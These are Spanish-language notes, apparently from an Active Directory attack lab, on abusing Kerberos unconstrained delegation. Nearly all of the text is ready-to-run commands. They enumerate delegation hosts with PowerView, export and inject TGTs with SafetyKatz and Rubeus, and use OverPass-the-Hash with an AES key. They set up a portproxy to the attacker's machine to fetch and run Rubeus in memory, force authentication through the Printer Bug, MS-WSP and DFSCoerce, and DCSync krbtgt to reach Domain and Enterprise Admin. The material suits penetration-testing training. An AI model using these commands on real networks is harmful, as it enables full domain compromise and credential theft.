# Kerberos Delegation 

Tags: #AD #Unconstrained_Delegation 

- **Kerberos Delegation** permite “reutilizar las credenciales del usuario final para acceder a recursos alojados en otro servidor”.
- Esto es típicamente útil en servicios o aplicaciones de múltiples capas donde se requiere el **doble salto (Kerberos Double Hop)**. Por ejemplo, un usuario se autentica en un servidor web (primer salto) y el servidor web realiza peticiones a un servidor de base de datos (segundo salto).
- La **suplantación de usuario (impersonation)** es el objetivo de la delegación.

# Unconstrained Delegation 

- Permite la delegación hacia cualquier servicio y cualquier recurso dentro del dominio, actuando como un usuario.
- Cuando la **delegación no restringida (unconstrained delegation)** está habilitada, el Domain Controller coloca el **TGT del usuario dentro del TGS**. En el primer salto, el TGT es extraído del TGS y almacenado en **LSASS**. De esta forma, el servidor puede reutilizar el TGT del usuario para acceder a cualquier otro recurso como si fuera ese usuario.
- ¡Esto es altamente susceptible de abuso!

```powershell 
! Usuario: Usuario de dominio 
# Abrir una consola con permisos de administrador local 

Paso 1:
❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat      # Abrir PS 
❯ . C:\AD\Tools\PowerView.ps1                            # Importar el módulo 

Paso 2:
❯ Get-DomainComputer -UnConstrained | select -ExpandProperty name 
# Enumera todos los equipos del dominio que tienen configurada la delegación Kerberos no restringida (Unconstrained Delegation) y muestra únicamente sus nombres.

❯ Get-DomainComputer -UnConstrained
❯ Get-DomainComputer -UnConstrained | select -ExpandProperty samaccountname 
# Enumerar equipos del dominio con Unconstrained Delegation habilitada usando PowerView — candidatos para capturar TGTs de usuarios que se conecten a ellos.

❯ Get-ADComputer -Filter {TrustedForDelegation -eq $True}
❯ Get-ADComputer -Identity server2 -Properties TrustedForDelegation, msDS-AllowedToDelegateTo
# Enumerar equipos con Unconstrained Delegation usando el módulo ActiveDirectory nativo.

❯ Get-ADUser -Filter {TrustedForDelegation -eq $True}
# Enumerar cuentas de usuario con Unconstrained Delegation habilitada usando el módulo ActiveDirectory nativo.
```

```powershell 
# Comprometer el/los servidor(es) donde la delegación no restringida (Unconstrained Delegation) esté habilitada.
# Debemos engañar o esperar a que un Domain Admin se conecte a un servicio en el servidor de aplicaciones (appsrv).

! Usuario: Administrador local del servidor con Unconstrained Delegation

❯ SafetyKatz.exe "sekurlsa::tickets /export"
# Exportar todos los tickets Kerberos en memoria a archivos .kirbi — tras esperar/forzar que un DA se conecte al servidor, su TGT quedará almacenado en LSASS.

❯ Safetykatz.exe "kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"
# Inyectar el TGT del Administrator exportado en la sesión actual para reutilizar su token y moverse lateralmente como DA.
```

```powershell 
# OverPass-The-Hash (OPTH) desde la sesión como administrador local para crear una nueva consola con el ticket 

Paso 3: 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Solicita un TGT legítimo para la cuenta appadmin utilizando su clave AES256 conocida, crea una nueva sesión Logon Type 9 (NetOnly), inyecta el TGT en esa sesión y abre una nueva consola CMD que utilizará la identidad Kerberos de appadmin.
```

```powershell 
# Dentro de la nueva consola con el ticket importado hacer lo siguiente:

Paso 4:
❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat       # Cambiar a PS
❯ . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1       # Importar el módulo 
❯ Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local 
# Enumera equipos del dominio donde el usuario actual tiene privilegios de administrador local y además puede acceder mediante PowerShell Remoting (WinRM)

❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
# Copia Loader.exe desde tu equipo actual al directorio C:\Users\Public del servidor dcorp-appsrv utilizando el recurso administrativo oculto C$

Paso 5: 
❯ winrs -r:dcorp-appsrv cmd
# Abre una consola CMD remota en dcorp-appsrv utilizando Windows Remote Management (WinRM)

# Dentro del server 'appadmin' ejecutar lo siguiente: 
❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
# Crea un proxy TCP en la máquina comprometida para que cualquier conexión al puerto 8080 sea redirigida al puerto 80 de tu máquina atacante
❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
# Descarga Rubeus.exe desde la URL especificada, lo ejecuta en memoria y monitoriza continuamente la aparición de tickets Kerberos del usuario DCORP-DC$ cada 5 segundos
```

## Use the Printer Bug for Coercion

```powershell 
Paso 6: 
# Con un nuevo cmd (usuario admnistrador local) en 'studentx' ejecutar lo siguiente:
❯ C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

NOTA: 
	- Se obtendra un ticket en base64 en la consola del server 'appadmin' el cual se importará

Paso 7:
# Importar el ticket en base64
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…     

Paso 8:
# Ejecutar el DCSync 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

## Use the Windows Search Protocol (MS-WSP) for Coercion

También podemos abusar de la Delegación No Restringida utilizando el protocolo Windows Search. Ten en cuenta que el servicio Windows Search está habilitado por defecto en equipos cliente, pero no en servidores. Para este laboratorio, lo hemos habilitado en el Domain Controller. Se requiere conectividad TCP 445 desde la Student VM hacia dcorp-dc y desde dcorp-dc hacia dcorp-appsrv.

```powershell 
# Utilizar usuario con permisos de administrador local 

❯ C:\AD\Tools\Loader.exe -path C:\AD\tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
# Utiliza Windows Search Protocol (WSP) para forzar que el Domain Controller (DCORP-DC) se autentique hacia DCORP-APPSRV
```

## Use the Distributed File System Protocol (MS-DFSNM) for Coercion

```powershell 
# Utilizar usuario con permisos de administrador local 

❯ C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
# Abusa del servicio DFS Namespace Management (MS-DFSNM) para forzar que el Domain Controller dcorp-dc se autentique hacia dcorp-appsrv
```

## Escalar a Enterprise Admin 

Para obtener privilegios de Enterprise Admin, se necesita forzar la autenticación desde mcorp-dc. Ejecutar el siguiente comando para escuchar tickets de mcorp-dc$ en dcorp-appsrv.

```powershell 
Paso 9:
# Desde la sesión que tiene el OPTH que anteriormente se había creado con el ticket de 'appadmin' en el paso 5

❯ winrs -r:dcorp-appsrv cmd 
# Abrir una consola CMD remota en dcorp-appsrv utilizando Windows Remote Management (WinRM) si ya no se tiene la sesión activa pero si la consola con el ticket importado 

❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
# Descargar Rubeus.exe desde la URL especificada, lo ejecuta en memoria y monitoriza continuamente la aparición de tickets Kerberos del usuario DCORP-DC$ cada 5 segundos
```

```powershell 
Paso 10:
# Ejecutar el siguiente comandos desde una nueva consola como administrador local en studentx

# Utilizar MS-RPRN desde la Studentx VM para provocar una autenticación desde mcorp-dc hacia dcorp-appsrv.
❯ C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local

# Otras opciones alternativas:
# Utilizar MS-RPRN desde la Student VM para provocar una autenticación desde mcorp-dc hacia dcorp-appsrv.
❯ C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local


Paso 11:
# Importar ek ticket en base64 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…

# Hacer el DCSync 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```